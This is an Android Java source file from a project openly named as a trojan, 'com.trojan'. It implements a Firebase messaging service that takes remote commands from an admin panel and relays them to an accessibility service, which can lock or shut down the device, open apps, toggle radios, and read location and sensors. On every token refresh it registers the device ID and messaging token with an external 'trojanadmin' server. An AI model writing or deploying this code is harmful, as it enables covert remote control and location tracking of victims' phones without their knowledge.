package com.trojan;

import android.content.Intent;
import android.provider.Settings;
import android.util.Log;
import androidx.annotation.NonNull;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Map;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    /**
     * Called when a new FCM message is received from the admin panel.
     */
    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        Log.d(TAG, "FCM Message From: " + remoteMessage.getFrom());

        // Ensure the message has a data payload.
        if (remoteMessage.getData().isEmpty()) {
            Log.w(TAG, "Received FCM message without data payload.");
            return;
        }

        Map<String, String> data = remoteMessage.getData();
        Log.d(TAG, "Message data payload: " + data);

        String action = data.get("action");
        if (action == null) {
            Log.w(TAG, "No 'action' key found in FCM message data.");
            return;
        }

        // Create the base Intent that will be broadcast to the PowerAccessibilityService.
        Intent intent = null;

        // Use a switch to create the correct Intent based on the action received.
        switch (action.toLowerCase()) {
            case "lock":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN);
                break;
            case "shutdown":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN);
                break;
            case "list_apps":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LIST_APPS);
                break;
            case "get_current_app":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_GET_CURRENT_APP);
                break;
            case "open_app":
                String packageToOpen = data.get("package_name");
                if (packageToOpen != null && !packageToOpen.isEmpty()) {
                    intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_OPEN_APP);
                    intent.putExtra("package_name", packageToOpen);
                } else {
                    Log.w(TAG, "Action 'open_app' received without 'package_name' extra data.");
                }
                break;
            case "nav_back":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_NAV_BACK);
                break;
            case "nav_home":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_NAV_HOME);
                break;
            case "nav_recents":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_NAV_RECENTS);
                break;
            case "wake_device":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_WAKE_DEVICE);
                break;
            case "toggle_wifi":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_TOGGLE_WIFI);
                break;
            case "toggle_bluetooth":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_TOGGLE_BLUETOOTH);
                break;
            case "toggle_location":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_TOGGLE_LOCATION);
                break;
            case "get_location":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_GET_LOCATION);
                break;
            case "get_sensors":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_GET_SENSORS);
                break;
            case "get_screen_status":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_GET_SCREEN_STATUS);
                break;
            case "get_battery_status":
                intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_GET_BATTERY_STATUS);
                break;
            default:
                Log.w(TAG, "Received unknown action: " + action);
                break;
        }

        // If a valid intent was created, broadcast it to the rest of the app.
        if (intent != null) {
            Log.d(TAG, "Broadcasting action: " + intent.getAction());

            // --- THIS IS THE CRITICAL FIX ---
            // An intent sent from a background service must be made explicit
            // by setting the package, otherwise modern Android versions will drop it.
            intent.setPackage(getPackageName());

            sendBroadcast(intent);
        }
    }

    /**
     * Called when the FCM token is refreshed. This is crucial for ensuring the
     * admin panel can always reach the device.
     */
    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        Log.i(TAG, "Refreshed FCM token: " + token);

        // --- THIS IS THE SECOND CRITICAL FIX ---
        // Immediately send the new token to your server to prevent commands
        // from being sent to an old, invalid token.
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (deviceId != null) {
            registerNewTokenWithServer(deviceId, token);
        }
    }

    /**
     * Sends the new token and device ID to the Netlify backend.
     * This logic is duplicated from MainActivity to ensure it runs even
     * when the app is in the background.
     */
    private void registerNewTokenWithServer(String deviceId, String token) {
        RequestQueue queue = Volley.newRequestQueue(this);
        String url = "https://trojanadmin.netlify.app/.netlify/functions/register-device";

        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("token", token);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON for new token registration", e);
            return;
        }

        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, postData,
                response -> Log.i(TAG, "Successfully re-registered refreshed FCM token."),
                error -> Log.e(TAG, "Failed to re-register refreshed FCM token: " + error.toString())
        );
        queue.add(request);
    }
}
